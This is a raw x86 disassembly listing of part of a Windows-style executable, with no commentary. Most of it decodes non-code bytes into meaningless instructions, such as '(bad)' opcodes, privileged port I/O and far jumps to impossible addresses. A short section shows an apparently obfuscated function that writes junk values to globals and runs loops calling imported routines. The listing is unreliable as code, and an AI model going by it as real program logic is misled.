  40d1f4:	out    0xd0,eax
  40d1f6:	dec    eax
  40d1f7:	aas    
  40d1f8:	nop
  40d1f9:	test   al,0xf
  40d1fb:	inc    cl
  40d1fd:	pop    esp
  40d1fe:	int    0x14
  40d200:	in     eax,dx
  40d201:	sub    edi,DWORD PTR [edi*8-0x205a3585]
  40d208:	pop    es
  40d209:	dec    edi
  40d20a:	cmp    al,0xbb
  40d20c:	jecxz  0x40d259
  40d20e:	jmp    0x5249f8
  40d213:	fistp  DWORD PTR [eax]
  40d215:	jmp    0x3492f006
  40d21a:	mov    cs,edi
  40d21c:	push   edi
  40d21d:	(bad)  
  40d21e:	inc    esp
  40d21f:	mov    ebp,0xda78e18d
  40d224:	xor    BYTE PTR [ecx-0x5f],al
  40d227:	test   BYTE PTR [edx+esi*1-0x2afadcc7],dh
  40d22e:	sbb    ch,BYTE PTR [edi-0x28530ed8]
  40d234:	cmp    eax,0x9fd083bc
  40d239:	hlt    
  40d23a:	mov    ebp,0x177fd757
  40d23f:	test   al,0xbb
  40d241:	stos   DWORD PTR es:[edi],eax
  40d242:	pop    ds
  40d243:	mov    al,0x40
  40d245:	mov    WORD PTR [edx],es
  40d247:	js     0x40d1db
  40d249:	push   ds
  40d24a:	test   DWORD PTR [edx+0x2d],edi
  40d24d:	shr    ah,cl
  40d24f:	stos   BYTE PTR es:[edi],al
  40d250:	(bad)  
  40d251:	out    0x55,al
  40d253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d254:	jge    0x40d1ff
  40d256:	xchg   edx,eax
  40d257:	jl     0x40d289
  40d259:	cmc    
  40d25a:	mov    esi,0x3f868ef4
  40d25f:	and    DWORD PTR [edx+0x24d33182],0x8503977a
  40d269:	and    eax,0xd7fd264d
  40d26e:	mov    ah,0x54
  40d270:	xchg   esp,eax
  40d271:	push   es
  40d272:	mov    DWORD PTR [eax],edx
  40d274:	outs   dx,BYTE PTR ds:[esi]
  40d275:	leave  
  40d276:	push   ebp
  40d277:	or     al,0xdd
  40d279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d27a:	lods   al,BYTE PTR ds:[esi]
  40d27b:	outs   dx,BYTE PTR ds:[esi]
  40d27c:	dec    eax
  40d27d:	add    BYTE PTR [edi+eax*4],dh
  40d280:	nop
  40d281:	xchg   edx,eax
  40d282:	adc    al,0x3d
  40d284:	xor    BYTE PTR [eax+0x573ab063],ch
  40d28a:	inc    edi
  40d28b:	mov    ebx,DWORD PTR [esi+ebx*8]
  40d28e:	sti    
  40d28f:	je     0x40d2e6
  40d291:	sti    
  40d292:	mov    BYTE PTR [ebp-0x23],bh
  40d295:	push   0x76ee1e7c
  40d29a:	sbb    dl,bl
  40d29c:	fisub  DWORD PTR [ebp-0x7c]
  40d29f:	out    0xd,al
  40d2a1:	and    eax,0x6ee84e30
  40d2a6:	out    dx,eax
  40d2a7:	sub    BYTE PTR [ebx+0x73a339d5],cl
  40d2ad:	fwait
  40d2ae:	in     al,0xbe
  40d2b0:	dec    ebp
  40d2b1:	or     DWORD PTR [eax+0x3d7fc55e],edi
  40d2b7:	(bad)  
  40d2b8:	jmp    0x40d286
  40d2ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2bb:	popf   
  40d2bc:	imul   ecx,edx,0x24
  40d2bf:	inc    edi
  40d2c0:	xchg   BYTE PTR [edx-0x31949939],dh
  40d2c6:	(bad)  [edi-0x37]
  40d2c9:	fldenv [esi-0x16]
  40d2cc:	bound  ebx,QWORD PTR [ebp-0x362aa245]
  40d2d2:	cmp    al,0x84
  40d2d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2d5:	stc    
  40d2d6:	out    0x16,eax
  40d2d8:	mov    ?,WORD PTR [esp+esi*8-0x51]
  40d2dc:	mov    ds:0xb32b82e4,al
  40d2e1:	sbb    ebx,ecx
  40d2e3:	rcl    BYTE PTR [esi-0x7002aa8c],cl
  40d2e9:	xor    al,0x84
  40d2eb:	mov    al,0x75
  40d2ed:	inc    ebp
  40d2ee:	ins    DWORD PTR es:[edi],dx
  40d2ef:	mov    al,0x4e
  40d2f1:	lahf   
  40d2f2:	xor    ch,BYTE PTR [ecx+0x67d36141]
  40d2f8:	and    al,0x82
  40d2fa:	mov    ds:0x9e719410,al
  40d2ff:	sub    dh,BYTE PTR [edx]
  40d301:	and    al,0x84
  40d303:	div    DWORD PTR [edi+0x44]
  40d306:	cmp    ebp,DWORD PTR [eax]
  40d308:	push   eax
  40d309:	addr16 icebp 
  40d30b:	or     DWORD PTR [esi],0x4152d352
  40d311:	loop   0x40d314
  40d313:	pop    es
  40d314:	or     DWORD PTR [ebx],esp
  40d316:	cmp    al,0x5b
  40d318:	mov    eax,ds:0x3613944f
  40d31d:	sbb    eax,0x50fb1ab5
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	shr    BYTE PTR [edx],1
  40d33a:	cld    
  40d33b:	jge    0x40d2ed
  40d33d:	xchg   edi,eax
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	jmp    0xff07:0xa0c7a87b
  40d34b:	sbb    al,0x77
  40d34d:	add    DWORD PTR [edx+0x7f],0x29
  40d351:	ja     0x40d334
  40d353:	jo     0x40d3b4
  40d355:	inc    esi
  40d356:	je     0x40d3b3
  40d358:	aaa    
  40d359:	jecxz  0x40d39e
  40d35b:	out    dx,al
  40d35c:	fisubr WORD PTR [edi+ecx*4]
  40d35f:	or     DWORD PTR [esi+eax*2+0x6041ccd5],esi
  40d366:	inc    ebx
  40d367:	test   BYTE PTR [edx-0x5147fec4],0x5d
  40d36e:	nop
  40d36f:	clc    
  40d370:	pop    ds
  40d371:	(bad)  
  40d372:	push   ebx
  40d373:	fst    QWORD PTR [ebx]
  40d375:	aaa    
  40d376:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d378:	fwait
  40d379:	or     esp,DWORD PTR [ebp-0x46]
  40d37c:	inc    edx
  40d37d:	fstp   DWORD PTR [esi+0x12]
  40d380:	push   0x61
  40d382:	fstp   QWORD PTR [edi]
  40d384:	jge    0x40d36c
  40d386:	aaa    
  40d387:	(bad)  
  40d388:	int    0x3a
  40d38a:	mov    cl,0xe5
  40d38c:	int    0x49
  40d38e:	int    0x67
  40d390:	mov    edi,0xf6d512cf
  40d395:	mov    edx,DWORD PTR [esi+eax*8+0x3]
  40d399:	add    eax,DWORD PTR [ecx+0x3d]
  40d39c:	add    ebp,esp
  40d39e:	jmp    DWORD PTR [edi]
  40d3a0:	dec    edi
  40d3a1:	stos   BYTE PTR es:[edi],al
  40d3a2:	aad    0xbb
  40d3a4:	pop    edi
  40d3a5:	retf   0xbe62
  40d3a8:	into   
  40d3a9:	jne    0x40d3d0
  40d3ab:	jmp    0xc958b276
  40d3b0:	fistp  WORD PTR [edx]
  40d3b2:	out    0xea,eax
  40d3b4:	mov    ebp,0xf7acfeb6
  40d3b9:	sub    ecx,ebp
  40d3bb:	jecxz  0x40d378
  40d3bd:	popa   
  40d3be:	out    dx,eax
  40d3bf:	lods   al,BYTE PTR ds:[esi]
  40d3c0:	or     eax,0x2bb2948e
  40d3c5:	mov    al,ds:0xb4d58bf7
  40d3ca:	push   eax
  40d3cb:	(bad)  
  40d3cc:	add    eax,0xbf66459
  40d3d1:	icebp  
  40d3d2:	cmp    esi,DWORD PTR [ebp+0x6a3d47c0]
  40d3d8:	push   0xf42e041c
  40d3dd:	push   ss
  40d3de:	xchg   esp,eax
  40d3df:	jmp    0x33760bd8
  40d3e4:	cmp    BYTE PTR [edi-0x30],dl
  40d3e7:	push   edx
  40d3e8:	fistp  QWORD PTR [ecx]
  40d3ea:	xchg   esi,eax
  40d3eb:	mov    esi,0x4352c2c5
  40d3f0:	mov    dl,0x2c
  40d3f3:	retfw  
  40d3f5:	jb     0x40d3e0
  40d3f7:	repnz push ebp
  40d3f9:	and    eax,0xf439e0d4
  40d3fe:	jne    0x40d3d6
  40d400:	add    ebx,DWORD PTR [ebp+0x4c]
  40d403:	jl     0x40d41d
  40d405:	sbb    ebx,edi
  40d407:	daa    
  40d408:	and    esp,DWORD PTR [edx+0x6d934333]
  40d40e:	adc    ecx,DWORD PTR [edi*4-0x28013397]
  40d415:	xor    cl,bh
  40d417:	les    ebx,FWORD PTR [ebp+0x3b]
  40d41a:	rcr    BYTE PTR [ebp+0x556ef20],cl
  40d420:	test   BYTE PTR es:[eax+ecx*4+0x9],dh
  40d425:	(bad)  
  40d426:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40d428:	inc    ecx
  40d429:	jae    0x40d3b9
  40d42b:	or     ch,BYTE PTR [ecx-0x52080567]
  40d431:	add    BYTE PTR [esi+0x5],0xc6
  40d435:	test   DWORD PTR ds:0xf88ed7,edx
  40d43b:	mov    bh,0x6e
  40d43d:	fisub  WORD PTR [edx+0x3b5296dd]
  40d443:	sub    al,ch
  40d445:	fidiv  WORD PTR [eax+0x5d881253]
  40d44b:	add    ah,dl
  40d44d:	shl    DWORD PTR [edx],0x79
  40d450:	stos   DWORD PTR es:[edi],eax
  40d451:	bound  ecx,QWORD PTR [edx-0x2dcac278]
  40d457:	mov    eax,0xbfd48a34
  40d45c:	adc    al,0x36
  40d45e:	jnp    0x40d4a4
  40d460:	push   edx
  40d461:	xchg   ebx,eax
  40d462:	call   edi
  40d464:	wrmsr  
  40d466:	fmul   QWORD PTR [ebp+0x30]
  40d469:	imul   ecx,eax,0x953c1479
  40d46f:	xchg   ebx,eax
  40d470:	dec    ecx
  40d471:	enter  0x2ae3,0x5
  40d475:	push   es
  40d476:	test   al,0x3f
  40d478:	stc    
  40d479:	push   ds
  40d47a:	mov    eax,DWORD PTR [ebx+0x7108183c]
  40d480:	xchg   edx,eax
  40d481:	cmc    
  40d482:	pop    esp
  40d483:	ret    
  40d484:	cmc    
  40d485:	inc    ecx
  40d486:	fwait
  40d487:	int3   
  40d488:	scas   eax,DWORD PTR es:[edi]
  40d489:	add    eax,0xf70262f7
  40d48e:	pop    es
  40d48f:	push   esp
  40d490:	xor    dl,ah
  40d492:	int    0xbb
  40d494:	bound  ebx,QWORD PTR es:[ecx]
  40d497:	jp     0x40d423
  40d499:	ins    BYTE PTR es:[edi],dx
  40d49a:	(bad)  
  40d49c:	data16 adc BYTE PTR [esi-0x7a],al
  40d4a0:	push   edi
  40d4a1:	adc    dh,BYTE PTR [esi+0x39064f99]
  40d4a7:	or     al,0xa8
  40d4a9:	and    ch,cl
  40d4ab:	sub    eax,DWORD PTR [ecx-0x57]
  40d4ae:	retf   
  40d4af:	mov    ebp,0x5ac51ee8
  40d4b4:	ret    
  40d4b5:	xchg   DWORD PTR [esi+0x7a],edi
  40d4b8:	jmp    0xefe1c786
  40d4bd:	push   ds
  40d4be:	sbb    eax,0x484dcca4
  40d4c3:	jae    0x40d480
  40d4c5:	mov    edx,0x80dffb6e
  40d4ca:	push   edx
  40d4cb:	test   eax,0x74fb2321
  40d4d0:	fdivr  QWORD PTR [edi+0x10d03de1]
  40d4d6:	mov    ds:0x1a876f5a,eax
  40d4db:	add    ebp,DWORD PTR [edi-0x45a6a472]
  40d4e1:	pop    edi
  40d4e2:	cmp    BYTE PTR [ebp-0x69],0x2b
  40d4e6:	aas    
  40d4e7:	call   0xe85abcab
  40d4ec:	adc    al,0xa7
  40d4ee:	sub    al,0x3d
  40d4f0:	popa   
  40d4f1:	into   
  40d4f2:	jle    0x40d4e8
  40d4f4:	lahf   
  40d4f5:	or     DWORD PTR [edx-0xe47629d],edi
  40d4fb:	arpl   WORD PTR [edx+0x6e479633],bx
  40d501:	push   ebp
  40d502:	(bad)  
  40d503:	ins    BYTE PTR es:[edi],dx
  40d504:	aas    
  40d505:	xchg   ebx,eax
  40d506:	inc    esi
  40d507:	add    DWORD PTR [eax+esi*8-0x21],ebp
  40d50b:	fcomp  DWORD PTR [eax-0x34]
  40d50e:	repnz xchg esp,eax
  40d510:	cs xchg ecx,eax
  40d512:	aam    0xd
  40d514:	xor    edx,DWORD PTR [edi-0x7ac8eae]
  40d51a:	ficom  WORD PTR [ecx+ebp*1]
  40d51d:	popa   
  40d51e:	das    
  40d51f:	xchg   edi,eax
  40d520:	mov    ebx,0x26cdca5
  40d525:	xchg   ecx,eax
  40d526:	jmp    FWORD PTR [edi-0x75]
  40d529:	push   ecx
  40d52a:	loop   0x40d5a2
  40d52c:	cmp    al,0x27
  40d52e:	pop    ds
  40d52f:	add    al,al
  40d531:	mov    ebp,0x8dd2addd
  40d536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d537:	scas   al,BYTE PTR es:[edi]
  40d538:	mov    edi,0x46212279
  40d53d:	cs test ebx,edx
  40d540:	hlt    
  40d541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d542:	push   ds
  40d543:	pop    esp
  40d544:	push   0x29ccb098
  40d549:	jne    0x40d500
  40d54b:	cli    
  40d54c:	mov    cl,0xf8
  40d54e:	mov    DWORD PTR [edx+esi*1-0x10aa1869],edx
  40d555:	retf   
  40d556:	pop    eax
  40d557:	out    0xc0,al
  40d559:	test   eax,0x74a79d87
  40d55e:	and    DWORD PTR [ebp+0x1b],eax
  40d561:	outs   dx,BYTE PTR ds:[esi]
  40d562:	outs   dx,BYTE PTR ds:[esi]
  40d563:	stos   BYTE PTR es:[edi],al
  40d564:	test   al,0xca
  40d566:	push   edi
  40d567:	add    DWORD PTR [esp],ecx
  40d56a:	add    BYTE PTR [ebx],al
  40d56c:	mov    ds:0xfbc89ff4,al
  40d571:	cmp    BYTE PTR [esi+0xc],dl
  40d574:	adc    BYTE PTR [ebp+edx*2+0x1a],bl
  40d578:	push   ebp
  40d579:	cmp    ah,BYTE PTR [eax+0x26]
  40d57c:	aad    0xdf
  40d57e:	shr    DWORD PTR ds:0x6c31fe9d,1
  40d584:	jecxz  0x40d52d
  40d586:	imul   ecx,DWORD PTR [esi+0x3433c08],0x1c
  40d58d:	sbb    cl,BYTE PTR [ebx+0x33]
  40d590:	rol    BYTE PTR [ecx],cl
  40d592:	pop    ebp
  40d593:	hlt    
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4336a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433697,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43369b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4336a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4336e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43369b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433727,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43372f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43365b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4336db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433717,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433717
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433717,edx
  40d64f:	cmp    DWORD PTR ds:0x433717,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433717,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433663,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433663
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433663,edx
  40d68b:	cmp    DWORD PTR ds:0x433663,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433753
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433663,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433667
  40d6b7:	add    eax,DWORD PTR ds:0x43369b
  40d6bd:	mov    ds:0x433667,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x46a0482a
  40d6f9:	fisttp DWORD PTR [eax]
  40d6fb:	and    bh,BYTE PTR [edx-0x6e]
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d68b
  40d705:	inc    esi
  40d706:	int    0x9e
  40d708:	dec    edi
  40d709:	pop    ebx
  40d70a:	push   edx
  40d70b:	or     al,0x7a
  40d70d:	mov    al,0xc9
  40d70f:	stc    
  40d710:	jnp    0x40d6b3
  40d712:	jmp    0x60ec:0xc1ad05f1
  40d719:	sbb    dl,BYTE PTR [edx-0x5fa7494c]
  40d71f:	mov    edi,0xbd803af8
  40d724:	dec    ebp
  40d725:	dec    esi
  40d726:	aad    0xfe
  40d728:	sbb    DWORD PTR [ecx+0x1dab8f05],edi
  40d72e:	mov    al,0xb1
  40d730:	jecxz  0x40d759
  40d732:	dec    esp
  40d733:	pop    edx
  40d734:	mov    ah,0x31
  40d736:	leave  
  40d737:	lock lahf 
  40d739:	gs pop ecx
  40d73b:	mov    DWORD PTR [edi],0xd4ee8d69
  40d741:	mov    ebx,0xefdcd7c6
  40d746:	adc    DWORD PTR [ebp-0x3c],ebp
  40d749:	mov    dl,0x76
  40d74b:	outs   dx,DWORD PTR ds:[esi]
  40d74c:	sbb    bl,al
  40d74e:	adc    edx,eax
  40d750:	push   edi
  40d751:	stos   DWORD PTR es:[edi],eax
  40d752:	icebp  
  40d753:	jecxz  0x40d770
  40d755:	adc    ah,al
  40d757:	and    BYTE PTR [edi-0x5d5c6941],ah
  40d75d:	std    
  40d75e:	int3   
  40d75f:	xlat   BYTE PTR ds:[ebx]
  40d760:	out    0xf8,eax
  40d762:	and    bl,bl
  40d764:	cmp    eax,DWORD PTR [ecx]
  40d766:	pop    ss
  40d767:	ins    DWORD PTR es:[edi],dx
  40d768:	jo     0x40d7da
  40d76a:	sbb    eax,0x4c3ba67d
  40d76f:	bound  ebx,QWORD PTR [ebx+0x6b]
  40d772:	fstp   st(7)
  40d774:	mov    esp,0x1b564c92
  40d779:	hlt    
  40d77a:	xlat   BYTE PTR ds:[ebx]
  40d77b:	xor    esp,DWORD PTR [ecx+eax*2+0x7e2a2b99]
  40d782:	out    dx,eax
  40d783:	pop    eax
  40d784:	mov    DWORD PTR [edx],edx
  40d786:	push   es
  40d787:	inc    esp
  40d788:	loopne 0x40d750
  40d78a:	or     DWORD PTR ds:0x4c9c80fd,0xffffffb9
  40d791:	fsub   DWORD PTR [eax+0x5cd69d37]
  40d797:	jo     0x40d783
  40d799:	push   ebx
  40d79a:	ins    BYTE PTR es:[edi],dx
  40d79b:	das    
  40d79c:	fcmovne st,st(4)
  40d79e:	mov    edx,0xe7e22d4b
  40d7a3:	sti    
  40d7a4:	xchg   esi,eax
  40d7a5:	xchg   BYTE PTR [edi+edi*8+0xb],al
  40d7a9:	iret   
  40d7aa:	adc    eax,0xcfa5c9be
  40d7af:	push   es
  40d7b0:	adc    BYTE PTR [edx+eiz*4-0x4b],ch
  40d7b4:	adc    BYTE PTR [eax],bh
  40d7b6:	mov    bh,0xd6
  40d7b8:	fs jb  0x40d7c6
  40d7bb:	pushf  
  40d7bc:	retf   
  40d7bd:	push   edi
  40d7be:	sbb    eax,0xfd078ce3
  40d7c3:	hlt    
  40d7c4:	pop    esp
  40d7c5:	mov    ah,0x12
  40d7c7:	ins    BYTE PTR es:[edi],dx
  40d7c8:	icebp  
  40d7c9:	sbb    al,0xb1
  40d7cb:	cmp    al,0x7a
  40d7cd:	jnp    0x40d80f
  40d7cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7d0:	mov    ch,0xb4
  40d7d2:	lahf   
  40d7d3:	in     eax,0x55
  40d7d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7d6:	push   eax
  40d7d7:	dec    ecx
  40d7d8:	fist   DWORD PTR [ecx]
  40d7da:	arpl   WORD PTR [esi],bp
  40d7dc:	dec    esi
  40d7dd:	xor    al,0x5e
  40d7df:	loop   0x40d7d1
  40d7e1:	mov    ebp,0x6ce67fb2
  40d7e6:	gs test eax,0xc92c1d3b
  40d7ec:	fild   WORD PTR [eax-0x2a]
  40d7ef:	gs aas 
  40d7f1:	mov    ds:0xb8483db4,al
  40d7f6:	test   al,0x3b
  40d7f8:	outs   dx,DWORD PTR ds:[esi]
  40d7f9:	and    edx,DWORD PTR [ecx+0x73714c86]
  40d7ff:	(bad)  
  40d800:	enter  0x13db,0xf2
  40d804:	xor    ah,0x3f
  40d807:	icebp  
  40d808:	xor    bl,BYTE PTR [ebp+0x6ce67d42]
  40d80e:	pusha  
  40d80f:	sbb    al,0x9f
  40d811:	add    edi,ecx
  40d813:	mov    BYTE PTR [ebp-0x32ff0f1f],dl
  40d819:	test   edx,esp
  40d81b:	mov    al,ds:0xe6d73cce
  40d820:	aam    0x61
  40d822:	push   ebx
  40d823:	(bad)  
  40d824:	lea    esp,[ebx]
  40d826:	fbld   TBYTE PTR [esp+ecx*2+0x14450491]
  40d82d:	ss xor eax,0x9720146e
  40d833:	fs cmp ebp,edx
  40d836:	sub    eax,DWORD PTR [edx]
  40d838:	ins    BYTE PTR es:[edi],dx
  40d839:	mov    edi,0x9c093757
  40d83e:	cwde   
  40d83f:	pushf  
  40d840:	or     ebx,DWORD PTR [edi]
  40d842:	pop    ebp
  40d843:	and    bl,cl
  40d845:	aam    0x95
  40d847:	test   BYTE PTR [edi+0x2dcb2c56],cl
  40d84d:	or     DWORD PTR [esi+eiz*1-0x410df5ad],ebx
  40d854:	leave  
  40d855:	int    0xe0
  40d857:	int3   
  40d858:	test   DWORD PTR [ebx+0x64],esi
  40d85b:	and    al,dh
  40d85d:	imul   edx,DWORD PTR [edx],0xffffffe0
  40d860:	ror    DWORD PTR [eax-0x3a],1
  40d863:	sbb    ebp,DWORD PTR [ebp-0x2fe27ebd]
  40d869:	rcr    BYTE PTR [eax+edi*1],cl
  40d86c:	cmp    eax,0x1a43e97b
  40d871:	xor    DWORD PTR [ecx-0x147369f4],ebp
  40d877:	jns    0x40d89e
  40d879:	psadbw mm7,mm7
  40d87c:	imul   ebp,DWORD PTR [ecx+0x2ee2979f],0x971ecc84
  40d886:	and    BYTE PTR [ebp+ebx*1-0x62cd476b],bl
  40d88d:	shl    BYTE PTR [esp+esi*8-0x33],cl
  40d891:	out    0x79,eax
  40d893:	shl    BYTE PTR [edi],1
  40d895:	lods   al,BYTE PTR ds:[esi]
  40d896:	xlat   BYTE PTR fs:[ebx]
  40d898:	cdq    
  40d899:	xor    eax,0xca1dbbb0
  40d89e:	mov    ebx,0xccda172f
  40d8a3:	xchg   ecx,eax
  40d8a4:	gs inc esi
  40d8a6:	mov    al,ds:0xdfee6c37
  40d8ab:	push   esi
  40d8ac:	mov    al,0xcc
  40d8ae:	jmp    FWORD PTR [edx+eax*4-0x79]
  40d8b2:	repnz test esp,esi
  40d8b5:	jp     0x40d842
  40d8b7:	cmp    eax,0xb679f6ad
  40d8bc:	and    bl,bh
  40d8be:	dec    edx
  40d8bf:	mov    ah,0x96
  40d8c1:	mov    cl,0xbb
  40d8c3:	jns    0x40d879
  40d8c5:	lods   eax,DWORD PTR ds:[esi]
  40d8c6:	pop    eax
  40d8c7:	pop    ss
  40d8c8:	(bad)  
  40d8c9:	lea    eax,[ecx-0x4a]
  40d8cc:	fadd   QWORD PTR [edi+0x1d]
  40d8cf:	or     ebx,ebx
  40d8d1:	push   ecx
  40d8d2:	xchg   ebx,eax
  40d8d3:	sbb    eax,0x812cb0aa
  40d8d8:	sub    ebx,edi
  40d8da:	bnd jno 0x40d87e
  40d8dd:	sbb    BYTE PTR ds:0x5567aad2,cl
  40d8e3:	cmp    ah,BYTE PTR [ebx]
  40d8e5:	dec    esi
  40d8e6:	sub    eax,0x18403da6
  40d8eb:	xlat   BYTE PTR ds:[ebx]
  40d8ec:	dec    edi
  40d8ed:	push   cs
  40d8ee:	or     edi,DWORD PTR [ebx+eax*8+0x67]
  40d8f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8f3:	int    0x65
  40d8f5:	call   0x2f15:0xe121a3fe
  40d8fc:	test   eax,0xafbc8f7e
  40d901:	dec    edi
  40d902:	sbb    ebp,DWORD PTR [esp+edx*2-0xf88bfc4]
  40d909:	sbb    al,0x6e
  40d90b:	inc    esp
  40d90c:	jl     0x40d906
  40d90e:	je     0x40d960
  40d910:	sub    ch,BYTE PTR [ebx+0x6022e47f]
  40d916:	rol    BYTE PTR [ebx+0x54879b07],1
  40d91c:	push   0x5028083e
  40d921:	fild   WORD PTR [esi]
  40d923:	mov    edx,0x2b910ae5
  40d928:	ins    DWORD PTR es:[edi],dx
  40d929:	ss inc eax
  40d92b:	xchg   ebx,eax
  40d92c:	cmp    ch,BYTE PTR [eax-0x60ee2aa4]
  40d932:	int3   
  40d933:	test   eax,0xfbdd1c66
  40d938:	mov    ebp,DWORD PTR [esi]
  40d93a:	inc    BYTE PTR [esi+0x6f]
  40d93d:	hlt    
  40d93e:	imul   ecx,edi,0xe867e788
  40d944:	mov    DWORD PTR [ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x112b51ed
  40d96a:	adc    edi,DWORD PTR [ebx-0x44]
  40d96d:	cmp    dl,BYTE PTR [eax+0x7c3e7e7e]
  40d973:	jle    0x40d9f3
  40d975:	cmp    al,0x9e
  40d977:	js     0x40d99c
  40d979:	enter  0x2212,0xa8
  40d97d:	jg     0x40d9c7
  40d97f:	push   ds
  40d980:	jge    0x40d989
  40d982:	loop   0x40d9ee
  40d984:	xor    edi,eax
  40d986:	sub    al,0x2d
  40d988:	out    0x27,al
  40d98a:	lods   eax,DWORD PTR ds:[esi]
  40d98b:	into   
  40d98c:	mov    eax,ds:0xd4132aea
  40d991:	or     BYTE PTR [edi-0x5799da41],bh
  40d997:	jp     0x40d9e2
  40d999:	ins    BYTE PTR es:[edi],dx
  40d99a:	das    
  40d99b:	or     eax,0x16efac0b
  40d9a0:	jo     0x40d958
  40d9a2:	jge    0x40d9de
  40d9a4:	jmp    0x6a427e7b
  40d9a9:	je     0x40da1f
  40d9ab:	popa   
  40d9ac:	hlt    
  40d9ad:	mov    eax,0xb3d02654
  40d9b2:	or     al,0x25
  40d9b4:	mov    eax,ds:0xa48d5557
  40d9b9:	jecxz  0x40da0f
  40d9bb:	push   ds
  40d9bc:	repz xchg edi,eax
  40d9be:	int    0xa8
  40d9c0:	cmp    al,0x41
  40d9c2:	pop    ecx
  40d9c3:	mov    bl,0x93
  40d9c5:	sbb    dh,ah
  40d9c7:	and    edi,0xacb3b49
  40d9cd:	test   cl,dh
  40d9cf:	lods   al,BYTE PTR ds:[esi]
  40d9d0:	mov    esp,DWORD PTR [edx+ecx*8+0x13df580e]
  40d9d7:	out    0xa8,eax
  40d9d9:	leave  
  40d9da:	rol    BYTE PTR [ebp+0x4d],cl
  40d9dd:	(bad)  
  40d9de:	loopne 0x40da3e
  40d9e0:	mov    cl,0xb7
  40d9e2:	push   ebp
  40d9e3:	mov    DWORD PTR [edx+0x12c763bb],esi
  40d9e9:	(bad)  
  40d9ea:	arpl   WORD PTR [ebx+edi*2],sp
  40d9ed:	jl     0x40da5e
  40d9ef:	xor    edx,edi
  40d9f1:	rcl    BYTE PTR [ecx],cl
  40d9f3:	ret    0x6b8b
  40d9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9f7:	xor    DWORD PTR [ebp+0x54],edx
  40d9fa:	push   es
  40d9fb:	mov    ds:0x26e8b0ac,al
